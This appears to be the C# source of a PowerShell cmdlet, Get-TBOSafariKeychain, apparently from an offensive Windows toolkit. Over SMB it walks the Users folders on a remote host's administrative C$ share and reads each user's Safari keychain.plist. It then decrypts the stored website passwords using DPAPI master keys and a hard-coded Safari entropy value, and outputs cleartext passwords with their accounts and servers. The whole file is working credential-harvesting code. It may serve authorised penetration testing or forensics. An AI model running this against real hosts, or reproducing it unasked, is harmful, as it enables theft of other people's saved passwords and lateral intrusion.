using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Threading;
using Claunia.PropertyList;
using Titanis;
using Titanis.Net;
using Titanis.Smb2;
using Titanis.Winterop;
using Winterop = Titanis.Winterop;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboSafariKeychainEntryInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string? UserName { get; init; }
		public string SourcePath { get; init; } = string.Empty;
		public string? Account { get; init; }
		public string? Server { get; init; }
		public string? Label { get; init; }
		public string? Password { get; init; }
		public string? PasswordHex { get; init; }
		public byte[]? PasswordBytes { get; init; }
		public string? MasterKeyGuid { get; init; }
		public bool HmacValidated { get; init; }
		public string? FailureReason { get; init; }
	}

	internal static class SafariKeychainHelpers
	{
		internal const string DefaultShareName = "C$";

		internal static string NormalizeServerName(string? serverName)
			=> DpapiHelpers.NormalizeServerName(serverName);

		internal static string NormalizeShareName(string? shareName)
			=> DpapiHelpers.NormalizeShareName(shareName);

		internal static bool IsMissingPath(NtstatusException ex)
		{
			return ex.StatusCode is Ntstatus.STATUS_OBJECT_NAME_NOT_FOUND
				or Ntstatus.STATUS_OBJECT_PATH_NOT_FOUND
				or Ntstatus.STATUS_OBJECT_NAME_INVALID;
		}

		internal static bool IsAccessDenied(NtstatusException ex)
		{
			return ex.StatusCode is Ntstatus.STATUS_ACCESS_DENIED
				or Ntstatus.STATUS_PRIVILEGE_NOT_HELD;
		}

		internal static IReadOnlyList<WildcardPattern> BuildUserFilters(string[]? filters)
		{
			if (filters == null || filters.Length == 0)
				return Array.Empty<WildcardPattern>();

			var patterns = new List<WildcardPattern>();
			foreach (var filter in filters)
			{
				if (string.IsNullOrWhiteSpace(filter))
					continue;
				patterns.Add(new WildcardPattern(filter, WildcardOptions.IgnoreCase));
			}

			return patterns;
		}

		private static bool MatchesUserFilter(string userName, IReadOnlyList<WildcardPattern> patterns)
		{
			if (patterns == null || patterns.Count == 0)
				return true;

			foreach (var pattern in patterns)
			{
				if (pattern == null)
					continue;
				if (pattern.IsMatch(userName))
					return true;
			}

			return false;
		}

		internal static IReadOnlyList<string> EnumerateUserDirectories(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			IReadOnlyList<WildcardPattern> userFilters,
			Action<string>? logWarning,
			Action<string>? logVerbose,
			Action<string, Exception>? logException,
			CancellationToken cancellationToken)
		{
			logWarning ??= _ => { };
			logVerbose ??= _ => { };
			logException ??= (context, ex) => smb.LogException(context, ex);

			var usersRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users");
			var fileSystem = SmbFileSystemResolver.Resolve(smb);

			var results = new List<string>();

			ISmbDirectory? dir = null;
			try
			{
				dir = fileSystem.OpenDirectory(usersRoot, cancellationToken);
				foreach (var entry in dir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.None, Titanis.Winterop.Security.SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken))
				{
					if (string.IsNullOrEmpty(entry.FileName))
						continue;
					if (entry.FileName is "." or "..")
						continue;

					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
					bool isReparse = (entry.FileAttributes & Winterop.FileAttributes.ReparsePoint) != 0;
					if (!isDirectory || isReparse)
						continue;

					if (!MatchesUserFilter(entry.FileName, userFilters))
						continue;

					results.Add(entry.FileName);
				}
			}
			catch (NtstatusException ex) when (IsMissingPath(ex))
			{
				logVerbose($"Get-TBOSafariKeychain could not open {usersRoot}: {ex.StatusCode}.");
			}
			catch (NtstatusException ex) when (IsAccessDenied(ex))
			{
				logWarning($"Get-TBOSafariKeychain was denied access to {usersRoot}: {ex.StatusCode}.");
			}
			catch (Exception ex)
			{
				logException($"Get-TBOSafariKeychain failed to enumerate {usersRoot}", ex);
				throw;
			}
			finally
			{
				dir?.Dispose();
			}

			return results;
		}

		internal static IReadOnlyDictionary<Guid, byte[]> BuildMasterKeySet(
			IEnumerable<TboDpapiMasterKeyInfo>? masterKeys,
			Action<string>? logWarning,
			string context)
		{
			logWarning ??= _ => { };
			context = string.IsNullOrWhiteSpace(context) ? "BuildMasterKeySet" : context;

			if (masterKeys == null)
				return new Dictionary<Guid, byte[]>();

			var results = new Dictionary<Guid, byte[]>();
			foreach (var entry in masterKeys)
			{
				if (entry == null)
					continue;
				if (string.IsNullOrWhiteSpace(entry.MasterKeyGuid) || string.IsNullOrWhiteSpace(entry.MasterKey))
					continue;
				if (!Guid.TryParse(entry.MasterKeyGuid, out var guid))
					continue;

				byte[] keyBytes;
				try
				{
					keyBytes = BinaryHelper.ParseHexString(entry.MasterKey.AsSpan());
				}
				catch (Exception ex)
				{
					logWarning($"{context} failed to parse master key {entry.MasterKeyGuid}: {ex.Message}");
					continue;
				}

				if (keyBytes.Length == 0)
					continue;
				results[guid] = keyBytes;
			}

			return results;
		}
	}

	internal static class SafariKeychainCrypto
	{
		// dpapick's Safari probe uses a fixed entropy/salt for all Safari passwords (see DPAPI/Probes/safari.py).
		private const string SafariEntropyHex =
			"1DACA8F8D3B8483E487D3E0A6207DD26E6678103E7B213A5B079EE4F0F4115ED7B148CE54B460DC18EFED6E72775068B" +
			"4900DC0F30A09EFD0985F1C8AA75C108057901E297D8AF8038600B710E6853772F0F61F61D8E8F5CB23D2174404BB506" +
			"6EAB7ABD8BA97E328F6E0624D929A4A5BE2623FDEEF14C0F745E58FB9174EF91636F6D2E6170706C652E536166617269";

		private static readonly byte[] SafariEntropyBytes = BinaryHelper.ParseHexString(SafariEntropyHex.AsSpan());

		private static readonly SecretDecodeOptions DecodeOptions = new SecretDecodeOptions
		{
			MinTextLength = 1,
			MinAsciiCount = 1,
			MinAsciiRatio = 0.2,
			MinPrintableRatio = 0.8,
			MaxNonAsciiRatio = 1.0,
			RejectReplacementChar = true,
			AllowControlChars = false
		};

		internal static void DecryptSafariPassword(
			byte[] dpapiBlobBytes,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
			Action<string>? logVerbose,
			out string? password,
			out string? passwordHex,
			out byte[]? passwordBytes,
			out string? masterKeyGuid,
			out bool hmacValidated,
			out string? failureReason)
		{
			logVerbose ??= _ => { };

			password = null;
			passwordHex = null;
			passwordBytes = null;
			masterKeyGuid = null;
			hmacValidated = false;
			failureReason = null;

			if (dpapiBlobBytes == null || dpapiBlobBytes.Length == 0)
			{
				failureReason = "Entry did not contain a Data blob.";
				return;
			}

			DpapiBlob blob;
			try
			{
				blob = DpapiBlob.Parse(dpapiBlobBytes, 0);
			}
			catch (Exception ex)
			{
				failureReason = $"Failed to parse DPAPI blob: {ex.Message}";
				return;
			}

			masterKeyGuid = blob.GuidMasterKey.ToString();
			if (!masterKeySet.TryGetValue(blob.GuidMasterKey, out var masterKey) || masterKey == null || masterKey.Length == 0)
			{
				failureReason = $"Master key {blob.GuidMasterKey} was not found in the supplied key set.";
				return;
			}

			var result = DpapiBlobCrypto.Decrypt(blob, masterKey, entropy: SafariEntropyBytes);
			hmacValidated = result.HmacValidated;
			if (result.Cleartext == null || result.Cleartext.Length < 4)
			{
				failureReason = result.FailureReason ?? "DPAPI decrypt returned empty cleartext.";
				return;
			}

			if (!TryExtractLengthPrefixed(result.Cleartext, out var extracted, out var extractFailure))
			{
				failureReason = extractFailure;
				return;
			}

			passwordBytes = extracted;
			passwordHex = extracted.ToHexString();

			var decoded = SecretDecoding.TryDecode(extracted, DecodeOptions, logVerbose);
			password = decoded.Text;
			if (password == null && !string.IsNullOrWhiteSpace(decoded.FailureReason))
				failureReason = $"Decrypted but did not decode as text: {decoded.FailureReason}";
		}

		private static bool TryExtractLengthPrefixed(byte[] cleartext, out byte[] extracted, out string? failureReason)
		{
			extracted = Array.Empty<byte>();
			failureReason = null;

			if (cleartext == null || cleartext.Length < 4)
			{
				failureReason = "Safari cleartext payload was too short.";
				return false;
			}

			uint length = BinaryPrimitives.ReadUInt32LittleEndian(cleartext.AsSpan(0, 4));
			if (length == 0)
			{
				extracted = Array.Empty<byte>();
				return true;
			}

			var remaining = cleartext.Length - 4;
			if (length > remaining)
			{
				failureReason = $"Safari cleartext length prefix ({length}) exceeded available bytes ({remaining}).";
				return false;
			}

			extracted = cleartext.AsSpan(4, (int)length).ToArray();
			return true;
		}
	}

	[Cmdlet(VerbsCommon.Get, "TBOSafariKeychain", DefaultParameterSetName = EnumerateParameterSet)]
	[OutputType(typeof(TboSafariKeychainEntryInfo))]
	public sealed class GetTBOSafariKeychain : SmbCmdlet
	{
		private const string EnumerateParameterSet = "Enumerate";
		private const string PathParameterSet = "Path";

		private static readonly string[] CandidateRelativePaths =
		{
			@"AppData\Roaming\Apple Computer\Safari\keychain.plist",
			@"AppData\Roaming\Apple Computer\Preferences\keychain.plist"
		};

		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
		public string ServerName { get; set; } = string.Empty;

		[Parameter(ParameterSetName = EnumerateParameterSet)]
		public string ShareName { get; set; } = SafariKeychainHelpers.DefaultShareName;

		[Parameter(ParameterSetName = EnumerateParameterSet)]
		public string[]? UserName { get; set; }

		[Parameter(Mandatory = true, Position = 1, ParameterSetName = PathParameterSet)]
		public string Path { get; set; } = string.Empty;

		[Parameter(Mandatory = true)]
		public TboDpapiMasterKeyInfo[]? MasterKeys { get; set; }

		private CancellationTokenSource? _cancelSource;

		protected override void ProcessRecord(ISmbProviderInfo smb)
		{
			this._cancelSource ??= new CancellationTokenSource();
			var cancellationToken = this._cancelSource.Token;

			var serverName = SafariKeychainHelpers.NormalizeServerName(this.ServerName);
			if (string.IsNullOrWhiteSpace(serverName))
				throw new ArgumentException("ServerName must be provided.", nameof(this.ServerName));

			var masterKeySet = SafariKeychainHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOSafariKeychain");

			if (this.ParameterSetName == PathParameterSet)
			{
				var uncPath = ResolveToUncPath(this.Path, nameof(this.Path));
				if (string.IsNullOrEmpty(uncPath.ShareName))
					throw new ArgumentException($"Path must include a share name: {uncPath}", nameof(this.Path));

				if (!string.IsNullOrEmpty(uncPath.ServerName)
					&& !uncPath.ServerName.Equals(serverName, StringComparison.OrdinalIgnoreCase))
					throw new ArgumentException($"ServerName '{serverName}' does not match UNC host '{uncPath.ServerName}'.", nameof(this.ServerName));

				byte[] bytes;
				try
				{
					bytes = DpapiHelpers.ReadFileBytes(smb, uncPath, cancellationToken);
				}
				catch (Exception ex)
				{
					this.LogException(smb, $"Get-TBOSafariKeychain failed to read '{uncPath}'", ex);
					return;
				}

				ProcessKeychainBytes(smb, serverName, userName: null, uncPath.ToString(), bytes, masterKeySet);
				return;
			}

			var shareName = SafariKeychainHelpers.NormalizeShareName(this.ShareName);
			if (string.IsNullOrWhiteSpace(shareName))
				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));

			var userFilters = SafariKeychainHelpers.BuildUserFilters(this.UserName);
			var users = SafariKeychainHelpers.EnumerateUserDirectories(
				smb,
				serverName,
				shareName,
				userFilters,
				logWarning: msg => this.LogWarning(smb, msg),
				logVerbose: msg => this.LogVerbose(smb, msg),
				logException: (context, ex) => this.LogException(smb, context, ex),
				cancellationToken);

			foreach (var user in users)
			{
				cancellationToken.ThrowIfCancellationRequested();

				var profileRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{user}");
				bool processedAny = false;

				foreach (var relative in CandidateRelativePaths)
				{
					var keychainPath = profileRoot.Append(relative);
					byte[] keychainBytes;
					try
					{
						keychainBytes = DpapiHelpers.ReadFileBytes(smb, keychainPath, cancellationToken);
					}
					catch (NtstatusException ex) when (SafariKeychainHelpers.IsMissingPath(ex))
					{
						this.LogVerbose(smb, $"Get-TBOSafariKeychain could not open {keychainPath}: {ex.StatusCode}.");
						continue;
					}
					catch (NtstatusException ex) when (SafariKeychainHelpers.IsAccessDenied(ex))
					{
						this.LogWarning(smb, $"Get-TBOSafariKeychain was denied access to {keychainPath}: {ex.StatusCode}.");
						continue;
					}
					catch (Exception ex)
					{
						this.LogException(smb, $"Get-TBOSafariKeychain failed to read '{keychainPath}'", ex);
						continue;
					}

					ProcessKeychainBytes(smb, serverName, user, keychainPath.ToString(), keychainBytes, masterKeySet);
					processedAny = true;
					break;
				}

				if (!processedAny)
					this.LogVerbose(smb, $"Get-TBOSafariKeychain did not find keychain.plist for user '{user}'.");
			}
		}

		protected override void StopProcessing()
		{
			this._cancelSource?.Cancel();
			base.StopProcessing();
		}

		private void ProcessKeychainBytes(
			ISmbProviderInfo smb,
			string serverName,
			string? userName,
			string sourcePath,
			byte[] keychainBytes,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet)
		{
			if (keychainBytes == null || keychainBytes.Length == 0)
			{
				this.WriteObject(new TboSafariKeychainEntryInfo
				{
					ServerName = serverName,
					UserName = userName,
					SourcePath = sourcePath,
					FailureReason = "keychain.plist was empty."
				});
				return;
			}

			IDictionary<string, object>? rootDict;
			try
			{
				var nsRoot = PropertyListParser.Parse(keychainBytes);
				var native = nsRoot.ToObject();
				rootDict = native as IDictionary<string, object>;
			}
			catch (Exception ex)
			{
				this.LogException(smb, $"Get-TBOSafariKeychain failed to parse '{sourcePath}'", ex);
				return;
			}

			if (rootDict == null)
			{
				this.WriteObject(new TboSafariKeychainEntryInfo
				{
					ServerName = serverName,
					UserName = userName,
					SourcePath = sourcePath,
					FailureReason = "keychain.plist root was not a dictionary."
				});
				return;
			}

			if (!rootDict.TryGetValue("version1", out var versionObj) || versionObj == null)
			{
				this.WriteObject(new TboSafariKeychainEntryInfo
				{
					ServerName = serverName,
					UserName = userName,
					SourcePath = sourcePath,
					FailureReason = "keychain.plist did not contain a 'version1' key."
				});
				return;
			}

			object[]? entries = versionObj as object[];
			if (entries == null && versionObj is IEnumerable<object> enumerable)
				entries = enumerable.ToArray();

			if (entries == null)
			{
				this.WriteObject(new TboSafariKeychainEntryInfo
				{
					ServerName = serverName,
					UserName = userName,
					SourcePath = sourcePath,
					FailureReason = "keychain.plist version1 was not an array."
				});
				return;
			}

			foreach (var entryObj in entries)
			{
				var entryDict = entryObj as IDictionary<string, object>;
				if (entryDict == null)
					continue;

				var account = GetString(entryDict, "Account") ?? GetString(entryDict, "acct");
				var server = GetString(entryDict, "Server") ?? GetString(entryDict, "srvr") ?? GetString(entryDict, "Where");
				var label = GetString(entryDict, "Label") ?? GetString(entryDict, "labl") ?? GetString(entryDict, "Description");

				var dataBytes = GetBytes(entryDict, "Data");

				SafariKeychainCrypto.DecryptSafariPassword(
					dataBytes ?? Array.Empty<byte>(),
					masterKeySet,
					logVerbose: msg => this.LogVerbose(smb, msg),
					out var password,
					out var passwordHex,
					out var passwordBytes,
					out var masterKeyGuid,
					out var hmacValidated,
					out var failureReason);

				this.WriteObject(new TboSafariKeychainEntryInfo
				{
					ServerName = serverName,
					UserName = userName,
					SourcePath = sourcePath,
					Account = account,
					Server = server,
					Label = label,
					Password = password,
					PasswordHex = passwordHex,
					PasswordBytes = passwordBytes,
					MasterKeyGuid = masterKeyGuid,
					HmacValidated = hmacValidated,
					FailureReason = failureReason
				});
			}
		}

		private static string? GetString(IDictionary<string, object> dict, string key)
		{
			if (dict.TryGetValue(key, out var value) && value != null)
				return value as string;
			return null;
		}

		private static byte[]? GetBytes(IDictionary<string, object> dict, string key)
		{
			if (!dict.TryGetValue(key, out var value) || value == null)
				return null;

			if (value is byte[] bytes)
				return bytes;

			return null;
		}

		private UncPath ResolveToUncPath(string path, string paramName)
		{
			if (string.IsNullOrWhiteSpace(path))
				throw new ArgumentException("Path must be provided.", paramName);

			if (UncPath.TryParse(path, out var uncPath) && uncPath != null)
				return uncPath;

			ProviderInfo? providerInfo;
			PSDriveInfo? driveInfo;
			string providerPath;
			try
			{
				providerPath = this.SessionState.Path.GetUnresolvedProviderPathFromPSPath(path, out providerInfo, out driveInfo);
			}
			catch (Exception ex)
			{
				throw new ArgumentException($"Path could not be resolved: {path}", paramName, ex);
			}

			if (string.IsNullOrWhiteSpace(providerPath))
				throw new ArgumentException($"Path could not be resolved: {path}", paramName);

			if (providerInfo == null || !providerInfo.Name.Equals(SmbProvider.ProviderName, StringComparison.OrdinalIgnoreCase))
				throw new ArgumentException($"Path must be a UNC path or a {SmbProvider.ProviderName} PSDrive path: {path}", paramName);

			if (UncPath.TryParse(providerPath, out var resolvedUnc) && resolvedUnc != null)
				return resolvedUnc;

			throw new ArgumentException($"Resolved provider path is not a UNC path: {providerPath}", paramName);
		}
	}
}
